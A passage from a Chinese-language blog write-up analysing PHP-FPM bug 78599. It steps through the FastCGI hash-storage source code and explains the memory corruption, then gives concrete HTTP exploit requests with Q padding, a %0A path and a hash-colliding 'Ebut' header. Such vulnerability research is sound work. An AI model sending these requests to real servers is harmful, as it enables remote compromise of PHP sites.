class="params">(fcgi_hash *h, <span class="keyword">char</span> *str, <span class="keyword">unsigned</span> <span class="keyword">int</span> str_len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">char</span> *ret;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (UNEXPECTED(h-&gt;data-&gt;pos + str_len + <span class="number">1</span> &gt;= h-&gt;data-&gt;<span class="built_in">end</span>)) &#123; <span class="comment">//FCGI_HASH_SEG_SIZE =  4096 </span></span><br><span class="line">		<span class="keyword">unsigned</span> <span class="keyword">int</span> seg_size = (str_len + <span class="number">1</span> &gt; FCGI_HASH_SEG_SIZE) ? str_len + <span class="number">1</span> : FCGI_HASH_SEG_SIZE;</span><br><span class="line">		fcgi_data_seg *p = (fcgi_data_seg*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(fcgi_data_seg) - <span class="number">1</span> + seg_size);</span><br><span class="line"></span><br><span class="line">		p-&gt;pos = p-&gt;data;</span><br><span class="line">		p-&gt;<span class="built_in">end</span> = p-&gt;pos + seg_size;</span><br><span class="line">		p-&gt;next = h-&gt;data;</span><br><span class="line">		h-&gt;data = p;</span><br><span class="line">	&#125;</span><br><span class="line">	ret = h-&gt;data-&gt;pos; <span class="comment">// 获取起始位置</span></span><br><span class="line">	<span class="built_in">memcpy</span>(ret, str, str_len);</span><br><span class="line">	ret[str_len] = <span class="number">0</span>;</span><br><span class="line">	h-&gt;data-&gt;pos += str_len + <span class="number">1</span>; </span><br><span class="line">	<span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>注意 <code>request.env.hash_table</code> 里面存储的是一系列的地址 </p>
<p><img src="http://pic.wonderkun.cc/uploads/2019/10/2019-10-29-00-09-30.png" alt="http://pic.wonderkun.cc/uploads/2019/10/2019-10-29-00-09-30.png"></p>
<p>但是这个地址分配在哪里呢？注意看如下结构体和代码:</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">fcgi_hash</span> &#123;</span></span><br><span class="line">	fcgi_hash_bucket  *hash_table[FCGI_HASH_TABLE_SIZE];</span><br><span class="line">	fcgi_hash_bucket  *<span class="built_in">list</span>;</span><br><span class="line">	fcgi_hash_buckets *buckets;</span><br><span class="line">	fcgi_data_seg     *data;</span><br><span class="line">&#125; fcgi_hash;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">fcgi_hash_buckets</span> &#123;</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span>	           idx;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> _<span class="title">fcgi_hash_buckets</span> *<span class="title">next</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> _<span class="title">fcgi_hash_bucket</span>   <span class="title">data</span>[<span class="title">FCGI_HASH_TABLE_SIZE</span>];</span></span><br><span class="line">&#125; fcgi_hash_buckets;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">char</span>* <span class="title">fcgi_hash_set</span><span class="params">(fcgi_hash *h, <span class="keyword">unsigned</span> <span class="keyword">int</span> hash_value, <span class="keyword">char</span> *var, <span class="keyword">unsigned</span> <span class="keyword">int</span> var_len, <span class="keyword">char</span> *val, <span class="keyword">unsigned</span> <span class="keyword">int</span> val_len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span>      idx = hash_value &amp; FCGI_HASH_TABLE_MASK; <span class="comment">// 127</span></span><br><span class="line">	fcgi_hash_bucket *p = h-&gt;hash_table[idx];</span><br><span class="line"></span><br><span class="line">  .....</span><br><span class="line"></span><br><span class="line">	p = h-&gt;buckets-&gt;data + h-&gt;buckets-&gt;idx; <span class="comment">// 找一个存储全局变量的空闲位置 </span></span><br><span class="line">	h-&gt;buckets-&gt;idx++;</span><br><span class="line">	p-&gt;next = h-&gt;hash_table[idx];</span><br><span class="line">	h-&gt;hash_table[idx] = p;</span><br><span class="line">	p-&gt;list_next = h-&gt;<span class="built_in">list</span>;</span><br><span class="line">	h-&gt;<span class="built_in">list</span> = p;</span><br><span class="line">	p-&gt;hash_value = hash_value;</span><br><span class="line">	p-&gt;var_len = var_len;</span><br><span class="line">	p-&gt;var = fcgi_hash_strndup(h, var, var_len); <span class="comment">// 保存 key </span></span><br><span class="line">	p-&gt;val_len = val_len;</span><br><span class="line">	p-&gt;val = fcgi_hash_strndup(h, val, val_len); <span class="comment">// 保存 val </span></span><br><span class="line">	<span class="keyword">return</span> p-&gt;val;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>从这些代码中可以看出 <code>request.env.buckets.data</code> 这个数组里面就保存了每个全局变量的对应的 <code>fcgi_hash_bucket</code> 结构。</p>
<p><img src="http://pic.wonderkun.cc/uploads/2019/10/2019-10-29-00-32-26.png" alt="http://pic.wonderkun.cc/uploads/2019/10/2019-10-29-00-32-26.png"></p>
<p>接下来继续分析，发现 <code>request.env.buckets.data[n].var</code> 和 <code>request.env.buckets.data[n].val</code> 里面分别存贮这全局变量名的地址，和全局变量值的地址，这个地址是由 <code>fcgi_hash_strndup</code> 函数分配得来的。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">char</span>* <span class="title">fcgi_hash_strndup</span><span class="params">(fcgi_hash *h, <span class="keyword">char</span> *str, <span class="keyword">unsigned</span> <span class="keyword">int</span> str_len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">char</span> *ret;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (UNEXPECTED(h-&gt;data-&gt;pos + str_len + <span class="number">1</span> &gt;= h-&gt;data-&gt;<span class="built_in">end</span>)) &#123; <span class="comment">//FCGI_HASH_SEG_SIZE =  4096 </span></span><br><span class="line">		<span class="keyword">unsigned</span> <span class="keyword">int</span> seg_size = (str_len + <span class="number">1</span> &gt; FCGI_HASH_SEG_SIZE) ? str_len + <span class="number">1</span> : FCGI_HASH_SEG_SIZE;</span><br><span class="line">		fcgi_data_seg *p = (fcgi_data_seg*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(fcgi_data_seg) - <span class="number">1</span> + seg_size);</span><br><span class="line"></span><br><span class="line">		p-&gt;pos = p-&gt;data;</span><br><span class="line">		p-&gt;<span class="built_in">end</span> = p-&gt;pos + seg_size;</span><br><span class="line">		p-&gt;next = h-&gt;data;</span><br><span class="line">		h-&gt;data = p;</span><br><span class="line">	&#125;</span><br><span class="line">	ret = h-&gt;data-&gt;pos; <span class="comment">// 获取起始位置</span></span><br><span class="line">	<span class="built_in">memcpy</span>(ret, str, str_len);</span><br><span class="line">	ret[str_len] = <span class="number">0</span>;</span><br><span class="line">	h-&gt;data-&gt;pos += str_len + <span class="number">1</span>; </span><br><span class="line">	<span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>从这个代码中可以看出，<code>request.env.data</code> 对应的结构体:</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">fcgi_data_seg</span> &#123;</span></span><br><span class="line">	<span class="keyword">char</span>                  *pos;</span><br><span class="line">	<span class="keyword">char</span>                  *<span class="built_in">end</span>;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> _<span class="title">fcgi_data_seg</span> *<span class="title">next</span>;</span></span><br><span class="line">	<span class="keyword">char</span>                   data[<span class="number">1</span>];</span><br><span class="line">&#125; fcgi_data_seg;</span><br></pre></td></tr></table></figure>
<p>是专门用来存储 fastcgi 全局变量的变量名和变量值的一个结构。 如果对c语言比较熟悉，就会明白，这里的<code>char data[1]</code>并不是表明此元素只占一个字节，这是c语言中定义包含不定长字符串的结构体的常用方法。pos 始终指向了data未使用空间的起始位置。</p>
<p><img src="http://pic.wonderkun.cc/uploads/2019/10/2019-10-29-00-48-59.png" alt="http://pic.wonderkun.cc/uploads/2019/10/2019-10-29-00-48-59.png"></p>
<p>我感觉我还是没说清楚，画个图吧,假设存储了全局变量 <code>PATH_INFO</code>之后(为了方便看，我把data字段横着放了)</p>
<figure class="highlight gherkin"><table><tr><td class="code"><pre><span class="line">+---------------------+</span><br><span class="line">|<span class="string">        pos          </span>|<span class="string">--------------------------------------------+  </span></span><br><span class="line"><span class="string">+---------------------+                                            </span>|</span><br><span class="line">|<span class="string">        end          </span>|<span class="string">                                            </span>|</span><br><span class="line">+---------------------+                                            |</span><br><span class="line">|<span class="string">      next = 0       </span>|<span class="string">                                            </span>|</span><br><span class="line">+---------------------+-------------------------|<span class="string">------------------+-------——+</span></span><br><span class="line">|<span class="string">      data = xxxx    </span>|<span class="string">SCRIPT_NAME\0/index.php\0</span>|<span class="string">PATH_INFO\0/test\0</span>|<span class="string">未使用空间 </span>|</span><br><span class="line">+---------------------+-------------------------|<span class="string">------------------+---------+</span></span><br></pre></td></tr></table></figure>

<p>这也就可以解释为什么所有的全局变量对应的 <code>fcgi_hash_buckets</code> 中的 <code>var</code>和<code>val</code>的值总是连续的地址空间。</p>
<p>根据 <a href="https://bugs.php.net/bug.php?id=78599" target="_blank" rel="noopener">https://bugs.php.net/bug.php?id=78599</a> 中的漏洞描述，他是修改了 <code>fcgi_hash_buckets</code> 结构中 <code>pos</code> 的最低位，实现的<code>request</code>全局变量的污染。我们再来看一下函数 <code>fcgi_hash_strndup</code>,如果可以控制<code>ret = h-&gt;data-&gt;pos;</code> 那么就可以控制 <code>memcpy(ret, str, str_len);</code>的写入位置，肯定有机会实现全局变量的污染。</p>
<p>那接下来就需要分析一下可行性了：</p>
<ol>
<li><code>env_path_info</code> 指针向前移动，有机会指向 <code>fcgi_data_seg.pos</code>的位置吗？ </li>
</ol>
<p>答案是肯定的，因为 <code>env_path_info</code> 指向了<code>fcgi_data_seg.data</code>中间的某个位置，他们都是在<code>fcgi_data_seg</code>结构体空间内的， 这是一个相差不太远的线性空间，只要控制合适的偏移，一定可以指向<code>fcgi_data_seg.pos</code>的低字节。 </p>
<ol start="2">
<li>只有 <code>fcgi_hash_strndup</code> 被调用之后，才会进行<code>memcpy</code>,在我们上面提到的第二个限制条件下，<code>fcgi_hash_strndup</code> 会被调用到吗？</li>
</ol>
<p>分析一下代码会发现，只有当注册新的fastcgi全局变量的时候，才会调用<code>fcgi_hash_strndup</code>,但是非常的凑巧，<code>FCGI_PUTENV(request, &quot;ORIG_SCRIPT_NAME&quot;, orig_script_name);</code> 正好注册了新的变量 <code>ORIG_SCRIPT_NAME</code>。 这个真是太凑巧了，没有这个函数调用，此漏洞根本没有办法被这么利用。</p>
<h3 id="0x5-巧妙的EXP"><a href="#0x5-巧妙的EXP" class="headerlink" title="0x5 巧妙的EXP"></a>0x5 巧妙的EXP</h3><p><strong>接下来的部分才是这篇文章最有意思的部分</strong></p>
<p>经过上面的分析，我们已经从理论上证明了可以污染<code>request</code>，但是我们没法实现攻击，因为不知道 <code>env_path_info</code>相对于 <code>fcgi_data_seg.pos</code>的偏移，另外环境不一样，这个偏移也不会是个恒定值。 那能不能让它变成一个恒定值呢？</p>
<p>我们想一下 <code>env_path_info</code>相对于 <code>fcgi_data_seg.pos</code> 之间偏移不确定的主要原因是什么？是因为我们不清楚<code>env_path_info</code> 之前的位置都存储了哪些全局变量的 var 和 val，他们是多长。但是如果 <code>PATH_INFO</code>全局变量可以存储在 <code>fcgi_data_seg.data</code>的开头，那情况就不一样了,如下图所示：</p>
<figure class="highlight lua"><table><tr><td class="code"><pre><span class="line"><span class="built_in">char</span> *pos </span><br><span class="line"><span class="comment">-------------  +8</span></span><br><span class="line"><span class="built_in">char</span> *<span class="keyword">end</span> </span><br><span class="line"><span class="comment">-------------  +8</span></span><br><span class="line"><span class="built_in">char</span> *<span class="built_in">next</span> </span><br><span class="line"><span class="comment">-------------  +8</span></span><br><span class="line">PATH_INFO\x00 </span><br><span class="line"><span class="comment">-------------  +10</span></span><br><span class="line">\x00           &lt;<span class="comment">---- env_path_info </span></span><br><span class="line"><span class="comment">-------------</span></span><br></pre></td></tr></table></figure>
<p>可以看到 <code>env_path_info</code> 和  <code>fcgi_data_seg.pos</code> 的地址的最低字节相差 34，这就是一个恒定值。</p>
<p>那目标就是要让<code>PATH</code>存储在 <code>fcgi_data_seg.data</code> 的首部，这样偏移就确定了。能否办到呢？</p>
<p>来再看一下如下代码:</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">char</span>* <span class="title">fcgi_hash_strndup</span><span class="params">(fcgi_hash *h, <span class="keyword">char</span> *str, <span class="keyword">unsigned</span> <span class="keyword">int</span> str_len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">char</span> *ret;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (UNEXPECTED(h-&gt;data-&gt;pos + str_len + <span class="number">1</span> &gt;= h-&gt;data-&gt;<span class="built_in">end</span>)) &#123; <span class="comment">//FCGI_HASH_SEG_SIZE =  4096 </span></span><br><span class="line">		<span class="keyword">unsigned</span> <span class="keyword">int</span> seg_size = (str_len + <span class="number">1</span> &gt; FCGI_HASH_SEG_SIZE) ? str_len + <span class="number">1</span> : FCGI_HASH_SEG_SIZE;</span><br><span class="line">		fcgi_data_seg *p = (fcgi_data_seg*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(fcgi_data_seg) - <span class="number">1</span> + seg_size);</span><br><span class="line"></span><br><span class="line">		p-&gt;pos = p-&gt;data;</span><br><span class="line">		p-&gt;<span class="built_in">end</span> = p-&gt;pos + seg_size;</span><br><span class="line">		p-&gt;next = h-&gt;data;</span><br><span class="line">		h-&gt;data = p;</span><br><span class="line">	&#125;</span><br><span class="line">	ret = h-&gt;data-&gt;pos; <span class="comment">// 获取起始位置</span></span><br><span class="line">	<span class="built_in">memcpy</span>(ret, str, str_len);</span><br><span class="line">	ret[str_len] = <span class="number">0</span>;</span><br><span class="line">	h-&gt;data-&gt;pos += str_len + <span class="number">1</span>; </span><br><span class="line">	<span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>初始化的时候 <code>fcgi_data_seg</code> 的结构体大小是 <code>sizeof(fcgi_data_seg) - 1 + seg_size</code> ，考虑一下 0x10 对齐，所以大小应该是 <code>4096+32</code> 。 如果在存储 <code>PATH_INFO</code> 的时候，刚好空间不够用，也就是 <code>h-&gt;data-&gt;pos + str_len + 1 &gt;= h-&gt;data-&gt;end</code>，那么就会触发一次malloc，分配一块新的chunk，并且 <code>PATH_INFO</code> 就会存储在这个堆块的首部。</p>
<p>但是攻击者是盲测的，攻击者怎么知道什么时候触发了 <code>malloc</code> ？有没有什么标志特征呢？这就要看这个巧妙的poc了。</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/index.php/PHP%0Ais_the_shittiest_lang.php?QQQQQQQQQQQQQQQQQQQ...</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: localhost</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0</span><br><span class="line"><span class="attribute">D-Pisos</span>: 8=D</span><br><span class="line"><span class="attribute">Ebut</span>: mamku tvoyu</span><br></pre></td></tr></table></figure>

<p>利用这个payload，爆破 Q 的个数，直到 php-fpm 产生一次crash( 也就是返回404状态的时候),就说明产生了 <code>malloc</code>。为什么是这样的？</p>
<p>首先需要知道 Q 会在fastcgi的两个全局变量中出现,分别是 <code>QUERY_STRING</code> 和 <code>REQUEST_URI</code>两个地方出现。</p>
<p><img src="http://pic.wonderkun.cc/uploads/2019/10/2019-10-29-09-27-34.png" alt="http://pic.wonderkun.cc/uploads/2019/10/2019-10-29-09-27-34.png"></p>
<p>增加 Q 的个数，势必会占用之前的 <code>fcgi_data_seg.data</code> 的存储空间，导致在存储 <code>PATH_INFO</code> 的时候，原本的空间不够用，malloc新的空间。但是为什么 crash 的时候，就一定进行了<code>malloc</code>操作了呢？</p>
<p>这个精妙之处就需要看payload中的URL <code>/PHP%0Ais_the_shittiest_lang.php</code>, 此字符串的长度表示 <code>env_path_info</code> 向前移动的字节数，这里长度是<code>30</code>, 可以计算一下 <code>env_path_info - 30</code> 刚好是 <code>fcgi_data_seg.pos</code> 的第五个字节,用户态的地址一般只用了六个字节，这里把第五个字节设置为<code>\x00</code>，一定会引起一个地址非法，所以就会造成一次崩溃。所以在崩溃的时候，肯定是发生了<code>malloc</code>，并且是修改掉了<code>fcgi_data_seg.pos</code>的第五个字节。</p>
<p>造成第一次crash的payload如下:</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/index.php/PHP%0Ais_the_shittiest_lang.php?QQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQ</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: localhost</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0</span><br><span class="line"><span class="attribute">D-Pisos</span>: 8=D</span><br><span class="line"><span class="attribute">Ebut</span>: mamku tvoyu</span><br></pre></td></tr></table></figure>
<p>已经修改成功了。</p>
<p><img src="http://pic.wonderkun.cc/uploads/2019/10/2019-10-29-10-18-06.png" alt="http://pic.wonderkun.cc/uploads/2019/10/2019-10-29-10-18-06.png"></p>
<p>好，我们尝试一下去修改pos的第一个字节，那么 <code>/PHP%0Ais_the_shittiest_lang.php</code> 应该被扩充到 <code>34</code>个字节，尝试伪造请求如下：</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/index.php/PHP%0Ais_the_shittiest_lang.phpxxxx?QQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQ</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: localhost</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0</span><br><span class="line"><span class="attribute">D-Pisos</span>: 8=D</span><br><span class="line"><span class="attribute">Ebut</span>: mamku tvoyu</span><br></pre></td></tr></table></figure>

<p>这下见证奇迹的时刻到了,在<code>b /usr/src/php/sapi/fpm/fpm/fpm_main.c:1220</code>上打上断点，然后单步进行调试，修改前如下图：</p>
<p><img src="http://pic.wonderkun.cc/uploads/2019/10/2019-10-29-10-56-42.png" alt="http://pic.wonderkun.cc/uploads/2019/10/2019-10-29-10-56-42.png"></p>
<p>修改后:</p>
<p><img src="http://pic.wonderkun.cc/uploads/2019/10/2019-10-29-10-58-13.png" alt="http://pic.wonderkun.cc/uploads/2019/10/2019-10-29-10-58-13.png"></p>
<p>哎，搞了这么久，终于把这个破 <code>pos</code> 指回去了，可以修改内存中的数据了。</p>
<p>但是问题来了，我们修改点什么才能造成危害呢？ 首先想到的就是修改<code>PHP_VALUE</code> ，但是当前的全局变量中并没有 <code>PHP_VALUE</code> 啊,那怎么办？ 我们来看一下取全局变量的函数。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> FCGI_GETENV(request, name) \</span></span><br><span class="line">	fcgi_quick_getenv(request, name, <span class="keyword">sizeof</span>(name)<span class="number">-1</span>, FCGI_HASH_FUNC(name, <span class="keyword">sizeof</span>(name)<span class="number">-1</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">char</span>* <span class="title">fcgi_getenv</span><span class="params">(fcgi_request *req, <span class="keyword">const</span> <span class="keyword">char</span>* var, <span class="keyword">int</span> var_len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> val_len;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (!req) <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> fcgi_hash_get(&amp;req-&gt;env, FCGI_HASH_FUNC(var, var_len), (<span class="keyword">char</span>*)var, var_len, &amp;val_len);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">char</span> *<span class="title">fcgi_hash_get</span><span class="params">(fcgi_hash *h, <span class="keyword">unsigned</span> <span class="keyword">int</span> hash_value, <span class="keyword">char</span> *var, <span class="keyword">unsigned</span> <span class="keyword">int</span> var_len, <span class="keyword">unsigned</span> <span class="keyword">int</span> *val_len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span>      idx = hash_value &amp; FCGI_HASH_TABLE_MASK;</span><br><span class="line">	fcgi_hash_bucket *p = h-&gt;hash_table[idx];</span><br><span class="line"></span><br><span class="line">	<span class="keyword">while</span> (p != <span class="literal">NULL</span>) &#123;</span><br><span class="line">		<span class="keyword">if</span> (p-&gt;hash_value == hash_value &amp;&amp;</span><br><span class="line">		    p-&gt;var_len == var_len &amp;&amp;</span><br><span class="line">		    <span class="built_in">memcmp</span>(p-&gt;var, var, var_len) == <span class="number">0</span>) &#123;</span><br><span class="line">		    *val_len = p-&gt;val_len;</span><br><span class="line">		    <span class="keyword">return</span> p-&gt;val;</span><br><span class="line">		&#125;</span><br><span class="line">		p = p-&gt;next;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>我们需要伪造一个变量，它跟<code>PHP_VALUE</code>的hash一样，并且字符串长度相同，那么在取 <code>PHP_VALUE</code> 的时候就会找到我们伪造的变量的idx索引，但是还是过不了<code>memcmp(p-&gt;var, var, var_len) == 0)</code> 这个check，不过这个没有关系，我们不是有内存写吗？直接覆盖掉原来变量的<code>var</code>即可。</p>
<p>EXP中伪造的变量是 <code>HTTP_EBUT</code> (http的头字段都会被加上 HTTP_ , 然后大写，注册成变量的), 它和<code>PHP_VALUE</code>的长度相同，并且hash一样，不信你可以用hash函数算一下。</p>
